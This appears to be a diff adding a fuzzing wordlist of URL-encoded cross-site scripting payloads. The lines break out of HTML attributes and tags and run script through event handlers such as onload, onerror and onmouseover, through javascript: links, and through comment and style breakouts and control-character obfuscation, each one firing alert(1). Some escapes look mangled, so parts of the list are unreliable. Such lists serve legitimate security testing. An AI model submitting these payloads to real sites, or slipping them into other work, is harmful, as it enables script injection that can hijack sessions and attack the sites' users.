+%3Chtml%20onMouseUp%20html%20onMouseUp=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseUp%3E  
+%22%3E%3Chtml%20onMouseUp%20html%20onMouseUp=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseUp%3E  
+'%3E%3Chtml%20onMouseUp%20html%20onMouseUp=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseUp%3E  
+%3Cbody%20onPropertyChange%20body%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPropertyChange%3E  
+%22%3E%3Cbody%20onPropertyChange%20body%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPropertyChange%3E  
+'%3E%3Cbody%20onPropertyChange%20body%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPropertyChange%3E  
+%3Csvg%20onLoad%20svg%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onLoad%3E  
+%22%3E%3Csvg%20onLoad%20svg%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onLoad%3E  
+'%3E%3Csvg%20onLoad%20svg%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onLoad%3E  
+%3Cbody%20onPageHide%20body%20onPageHide=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPageHide%3E  
+%22%3E%3Cbody%20onPageHide%20body%20onPageHide=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPageHide%3E  
+%22%3E%3Cbody%20onUnload%20body%20onUnload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onUnload%3E  
+'%3E%3Cbody%20onUnload%20body%20onUnload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onUnload%3E  
+%3Cbody%20onLoad%20body%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/body%20onLoad%3E  
+%22%3E%3Cbody%20onLoad%20body%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/body%20onLoad%3E  
+'%3E%3Cbody%20onLoad%20body%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/body%20onLoad%3E  
+%3Cbgsound%20onPropertyChange%20bgsound%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/bgsound%20onPropertyChange%3E  
+%22%3E%3Cbgsound%20onPropertyChange%20bgsound%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/bgsound%20onPropertyChange%3E  
+'%3E%3Cbgsound%20onPropertyChange%20bgsound%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/bgsound%20onPropertyChange%3E  
+%3Chtml%20onMouseLeave%20html%20onMouseLeave=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseLeave%3E  
+%22%3E%3Chtml%20onMouseLeave%20html%20onMouseLeave=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseLeave%3E  
+'%3E%3Chtml%20onMouseLeave%20html%20onMouseLeave=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseLeave%3E  
+%3Chtml%20onMouseWheel%20html%20onMouseWheel=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseWheel%3E  
+%22%3E%3Chtml%20onMouseWheel%20html%20onMouseWheel=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseWheel%3E  
+'%3E%3Chtml%20onMouseWheel%20html%20onMouseWheel=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseWheel%3E  
+%3Cstyle%20onLoad%20style%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/style%20onLoad%3E  
+%22%3E%3Cstyle%20onLoad%20style%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/style%20onLoad%3E  
+'%3E%3Cstyle%20onLoad%20style%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/style%20onLoad%3E  
+%3Ciframe%20onReadyStateChange%20iframe%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onReadyStateChange%3E  
+%22%3E%3Ciframe%20onReadyStateChange%20iframe%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onReadyStateChange%3E  
+'%3E%3Ciframe%20onReadyStateChange%20iframe%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onReadyStateChange%3E  
+%3Cbody%20onPageShow%20body%20onPageShow=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPageShow%3E  
+%22%3E%3Cbody%20onPageShow%20body%20onPageShow=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPageShow%3E  
+'%3E%3Cbody%20onPageShow%20body%20onPageShow=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPageShow%3E  
+%3Cstyle%20onReadyStateChange%20style%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/style%20onReadyStateChange%3E  
+%22%3E%3Cstyle%20onReadyStateChange%20style%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/style%20onReadyStateChange%3E  
+'%3E%3Cstyle%20onReadyStateChange%20style%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/style%20onReadyStateChange%3E  
+%3Cframeset%20onFocus%20frameset%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onFocus%3E  
+%22%3E%3Cframeset%20onFocus%20frameset%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onFocus%3E  
+'%3E%3Cframeset%20onFocus%20frameset%20onFocus=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onFocus%3E  
+%3Capplet%20onError%20applet%20onError=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onError%3E  
+%22%3E%3Capplet%20onError%20applet%20onError=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onError%3E  
+'%3E%3Capplet%20onError%20applet%20onError=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onError%3E  
+%3Cmarquee%20onStart%20marquee%20onStart=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onStart%3E  
+%22%3E%3Cmarquee%20onStart%20marquee%20onStart=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onStart%3E  
+'%3E%3Cmarquee%20onStart%20marquee%20onStart=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onStart%3E  
+%3Cscript%20onLoad%20script%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/script%20onLoad%3E  
+%22%3E%3Cscript%20onLoad%20script%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/script%20onLoad%3E  
+'%3E%3Cscript%20onLoad%20script%20onLoad=%22javascript:javascript:alert(1)%22%3E%3C/script%20onLoad%3E  
+%3Chtml%20onMouseOver%20html%20onMouseOver=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOver%3E  
+%22%3E%3Chtml%20onMouseOver%20html%20onMouseOver=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOver%3E  
+'%3E%3Chtml%20onMouseOver%20html%20onMouseOver=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOver%3E  
+%3Chtml%20onMouseEnter%20html%20onMouseEnter=%22javascript:parent.javascript:alert(1)%22%3E%3C/html%20onMouseEnter%3E  
+%22%3E%3Chtml%20onMouseEnter%20html%20onMouseEnter=%22javascript:parent.javascript:alert(1)%22%3E%3C/html%20onMouseEnter%3E  
+'%3E%3Chtml%20onMouseEnter%20html%20onMouseEnter=%22javascript:parent.javascript:alert(1)%22%3E%3C/html%20onMouseEnter%3E  
+%3Cbody%20onBeforeUnload%20body%20onBeforeUnload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onBeforeUnload%3E  
+%22%3E%3Cbody%20onBeforeUnload%20body%20onBeforeUnload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onBeforeUnload%3E  
+'%3E%3Cbody%20onBeforeUnload%20body%20onBeforeUnload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onBeforeUnload%3E  
+%3Chtml%20onMouseDown%20html%20onMouseDown=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseDown%3E  
+%22%3E%3Chtml%20onMouseDown%20html%20onMouseDown=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseDown%3E  
+'%3E%3Chtml%20onMouseDown%20html%20onMouseDown=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseDown%3E  
+%3Cmarquee%20onScroll%20marquee%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onScroll%3E  
+%22%3E%3Cmarquee%20onScroll%20marquee%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onScroll%3E  
+'%3E%3Cmarquee%20onScroll%20marquee%20onScroll=%22javascript:javascript:alert(1)%22%3E%3C/marquee%20onScroll%3E  
+%3Cxml%20onPropertyChange%20xml%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/xml%20onPropertyChange%3E  
+%22%3E%3Cxml%20onPropertyChange%20xml%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/xml%20onPropertyChange%3E  
+'%3E%3Cxml%20onPropertyChange%20xml%20onPropertyChange=%22javascript:javascript:alert(1)%22%3E%3C/xml%20onPropertyChange%3E  
+%3Cframeset%20onBlur%20frameset%20onBlur=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onBlur%3E  
+%22%3E%3Cframeset%20onBlur%20frameset%20onBlur=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onBlur%3E  
+'%3E%3Cframeset%20onBlur%20frameset%20onBlur=%22javascript:javascript:alert(1)%22%3E%3C/frameset%20onBlur%3E  
+%3Capplet%20onReadyStateChange%20applet%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onReadyStateChange%3E  
+%22%3E%3Capplet%20onReadyStateChange%20applet%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onReadyStateChange%3E  
+'%3E%3Capplet%20onReadyStateChange%20applet%20onReadyStateChange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onReadyStateChange%3E  
+%3Csvg%20onUnload%20svg%20onUnload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onUnload%3E  
+%22%3E%3Csvg%20onUnload%20svg%20onUnload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onUnload%3E  
+'%3E%3Csvg%20onUnload%20svg%20onUnload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onUnload%3E  
+%3Chtml%20onMouseOut%20html%20onMouseOut=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOut%3E  
+%22%3E%3Chtml%20onMouseOut%20html%20onMouseOut=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOut%3E  
+'%3E%3Chtml%20onMouseOut%20html%20onMouseOut=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseOut%3E  
+%3Cbody%20onMouseMove%20body%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseMove%3E  
+%22%3E%3Cbody%20onMouseMove%20body%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseMove%3E  
+'%3E%3Cbody%20onMouseMove%20body%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/body%20onMouseMove%3E  
+%3Cbody%20onResize%20body%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/body%20onResize%3E  
+%22%3E%3Cbody%20onResize%20body%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/body%20onResize%3E  
+'%3E%3Cbody%20onResize%20body%20onResize=%22javascript:javascript:alert(1)%22%3E%3C/body%20onResize%3E  
+%3Cobject%20onError%20object%20onError=%22javascript:javascript:alert(1)%22%3E%3C/object%20onError%3E  
+%22%3E%3Cobject%20onError%20object%20onError=%22javascript:javascript:alert(1)%22%3E%3C/object%20onError%3E  
+'%3E%3Cobject%20onError%20object%20onError=%22javascript:javascript:alert(1)%22%3E%3C/object%20onError%3E  
+%3Cbody%20onPopState%20body%20onPopState=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPopState%3E  
+%22%3E%3Cbody%20onPopState%20body%20onPopState=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPopState%3E  
+'%3E%3Cbody%20onPopState%20body%20onPopState=%22javascript:javascript:alert(1)%22%3E%3C/body%20onPopState%3E  
+%3Chtml%20onMouseMove%20html%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseMove%3E  
+%22%3E%3Chtml%20onMouseMove%20html%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseMove%3E  
+'%3E%3Chtml%20onMouseMove%20html%20onMouseMove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onMouseMove%3E  
+%3Capplet%20onreadystatechange%20applet%20onreadystatechange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onreadystatechange%3E  
+%22%3E%3Capplet%20onreadystatechange%20applet%20onreadystatechange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onreadystatechange%3E  
+'%3E%3Capplet%20onreadystatechange%20applet%20onreadystatechange=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onreadystatechange%3E  
+%3Cbody%20onpagehide%20body%20onpagehide=%22javascript:javascript:alert(1)%22%3E%3C/body%20onpagehide%3E  
+%22%3E%3Cbody%20onpagehide%20body%20onpagehide=%22javascript:javascript:alert(1)%22%3E%3C/body%20onpagehide%3E  
+'%3E%3Cbody%20onpagehide%20body%20onpagehide=%22javascript:javascript:alert(1)%22%3E%3C/body%20onpagehide%3E  
+%3Csvg%20onunload%20svg%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onunload%3E  
+%22%3E%3Csvg%20onunload%20svg%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onunload%3E  
+'%3E%3Csvg%20onunload%20svg%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onunload%3E  
+%3Capplet%20onerror%20applet%20onerror=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onerror%3E  
+%22%3E%3Capplet%20onerror%20applet%20onerror=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onerror%3E  
+'%3E%3Capplet%20onerror%20applet%20onerror=%22javascript:javascript:alert(1)%22%3E%3C/applet%20onerror%3E  
+%3Cbody%20onkeyup%20body%20onkeyup=%22javascript:javascript:alert(1)%22%3E%3C/body%20onkeyup%3E  
+%22%3E%3Cbody%20onkeyup%20body%20onkeyup=%22javascript:javascript:alert(1)%22%3E%3C/body%20onkeyup%3E  
+'%3E%3Cbody%20onkeyup%20body%20onkeyup=%22javascript:javascript:alert(1)%22%3E%3C/body%20onkeyup%3E  
+%3Cbody%20onunload%20body%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onunload%3E  
+%22%3E%3Cbody%20onunload%20body%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onunload%3E  
+'%3E%3Cbody%20onunload%20body%20onunload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onunload%3E  
+%3Ciframe%20onload%20iframe%20onload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onload%3E  
+%22%3E%3Ciframe%20onload%20iframe%20onload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onload%3E  
+'%3E%3Ciframe%20onload%20iframe%20onload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onload%3E  
+%3Cbody%20onload%20body%20onload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onload%3E  
+%22%3E%3Cbody%20onload%20body%20onload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onload%3E  
+'%3E%3Cbody%20onload%20body%20onload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onload%3E  
+%3Chtml%20onmouseover%20html%20onmouseover=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmouseover%3E  
+%22%3E%3Chtml%20onmouseover%20html%20onmouseover=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmouseover%3E  
+'%3E%3Chtml%20onmouseover%20html%20onmouseover=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmouseover%3E  
+%3Cobject%20onbeforeload%20object%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/object%20onbeforeload%3E  
+%22%3E%3Cobject%20onbeforeload%20object%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/object%20onbeforeload%3E  
+'%3E%3Cobject%20onbeforeload%20object%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/object%20onbeforeload%3E  
+%3Cbody%20onbeforeunload%20body%20onbeforeunload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onbeforeunload%3E  
+%22%3E%3Cbody%20onbeforeunload%20body%20onbeforeunload=%22javascript:javascript:alert(1)%22%3E%3C/body%20onbeforeunload%3E  
+'%3E%3Cbody%20onkeydown%20body%20onkeydown=%22javascript:javascript:alert(1)%22%3E%3C/body%20onkeydown%3E  
+%3Ciframe%20onbeforeload%20iframe%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onbeforeload%3E  
+%22%3E%3Ciframe%20onbeforeload%20iframe%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onbeforeload%3E  
+'%3E%3Ciframe%20onbeforeload%20iframe%20onbeforeload=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20onbeforeload%3E  
+%3Ciframe%20src%20iframe%20src=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20src%3E  
+%22%3E%3Ciframe%20src%20iframe%20src=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20src%3E  
+'%3E%3Ciframe%20src%20iframe%20src=%22javascript:javascript:alert(1)%22%3E%3C/iframe%20src%3E  
+%3Csvg%20onload%20svg%20onload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onload%3E  
+%22%3E%3Csvg%20onload%20svg%20onload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onload%3E  
+'%3E%3Csvg%20onload%20svg%20onload=%22javascript:javascript:alert(1)%22%3E%3C/svg%20onload%3E  
+%3Chtml%20onmousemove%20html%20onmousemove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmousemove%3E  
+%22%3E%3Chtml%20onmousemove%20html%20onmousemove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmousemove%3E  
+'%3E%3Chtml%20onmousemove%20html%20onmousemove=%22javascript:javascript:alert(1)%22%3E%3C/html%20onmousemove%3E  
+%3Cbody%20onblur%20body%20onblur=%22javascript:javascript:alert(1)%22%3E%3C/body%20onblur%3E  
+%22%3E%3Cbody%20onblur%20body%20onblur=%22javascript:javascript:alert(1)%22%3E%3C/body%20onblur%3E  
+'%3E%3Cbody%20onblur%20body%20onblur=%22javascript:javascript:alert(1)%22%3E%3C/body%20onblur%3E  
+/x3Cscript%3Ejavascript:alert(1)%3C/script%3E  
+'%22%60%3E%3Cscript%3E/*%20*/x2Fjavascript:alert(1)//%20*/%3C/script%3E  
+%3Cscript%3Ejavascript:alert(1)%3C/script/x0D  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0D  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0D  
+%3Cscript%3Ejavascript:alert(1)%3C/script/x0A  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0A  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0A  
+%3Cscript%3Ejavascript:alert(1)%3C/script/x0B  
+%22%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0B  
+'%3E%3Cscript%3Ejavascript:alert(1)%3C/script/x0B  
+%3Cscript%20charset=%22/x22%3Ejavascript:alert(1)%3C/script%3E  
+%22%3E%3Cscript%20charset=%22/x22%3Ejavascript:alert(1)%3C/script%3E  
+'%3E%3Cscript%20charset=%22/x22%3Ejavascript:alert(1)%3C/script%3E  
+%3C!--/x3E%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+%22%3E%3C!--/x3E%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+'%3E%3C!--/x3E%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+--%3E%3C!--%20---%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+--%3E%3C!--%20--/x00%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+--%3E%3C!--%20--/x21%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+--%3E%3C!--%20--/x3E%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E  
+%60%22'%3E%3Cimg%20src='  
+%3Ca%20href=%22javascript/x3Ajavascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javascript/x3Ajavascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javascript/x3Ajavascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22'%60%3E%3Cp%3E%3Csvg%3E%3Cscript%3Ea='hello/x27;javascript:alert(1)//';%3C/script%3E%3C/p%3E  
+%3Ca%20href=%22javas/x00cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x00cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x00cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x07cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x07cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x07cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x0Dcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x0Dcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x0Dcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x0Acript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x0Acript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x0Acript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x08cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x08cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x08cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x02cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x02cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x02cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x03cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x03cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x03cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x04cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x04cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x04cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x01cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x01cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x01cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x05cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x05cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x05cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x0Bcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x0Bcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x0Bcript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x09cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x09cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x09cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x06cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x06cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x06cript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Ca%20href=%22javas/x0Ccript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%22%3E%3Ca%20href=%22javas/x0Ccript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+'%3E%3Ca%20href=%22javas/x0Ccript:javascript:alert(1)%22%20id=%22fuzzelement1%22%3Etest%3C/a%3E  
+%3Cscript%3E/*%20*/x2A/javascript:alert(1)//%20*/%3C/script%3E  
+%22%3E%3Cscript%3E/*%20*/x2A/javascript:alert(1)//%20*/%3C/script%3E  
+'%3E%3Cscript%3E/*%20*/x2A/javascript:alert(1)//%20*/%3C/script%3E  
+%3Cscript%3E/*%20*/x00/javascript:alert(1)//%20*/%3C/script%3E  
+%22%3E%3Cscript%3E/*%20*/x00/javascript:alert(1)//%20*/%3C/script%3E  
+'%3E%3Cscript%3E/*%20*/x00/javascript:alert(1)//%20*/%3C/script%3E  
+%3Cstyle%3E%3C/style/x3E%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style/x3E%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style/x3E%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%3Cstyle%3E%3C/style/x0D%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style/x0D%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style/x0D%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%3Cstyle%3E%3C/style/x09%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style/x09%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style/x09%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%3Cstyle%3E%3C/style/x20%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style/x20%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style/x20%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%3Cstyle%3E%3C/style/x0A%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22%3E%3Cstyle%3E%3C/style/x0A%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+'%3E%3Cstyle%3E%3C/style/x0A%3Cimg%20src=%22about:blank%22%20onerror=javascript:alert(1)//%3E%3C/style%3E  
+%22'%60%3EABC%3Cdiv%20style=%22font-family:'foo'/x7Dx:expression(javascript:alert(1);/*';%22%3EDEF  
+%22'%60%3EABC%3Cdiv%20style=%22font-family:'foo'/x3Bx:expression(javascript:alert(1);/*';%22%3EDEF  
+%3Cscript%3Eif(%22x//xE1/x96/x89%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+%22%3E%3Cscript%3Eif(%22x//xE1/x96/x89%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
+'%3E%3Cscript%3Eif(%22x//xE1/x96/x89%22.length==2)%20%7B%20javascript:alert(1);%7D%3C/script%3E  
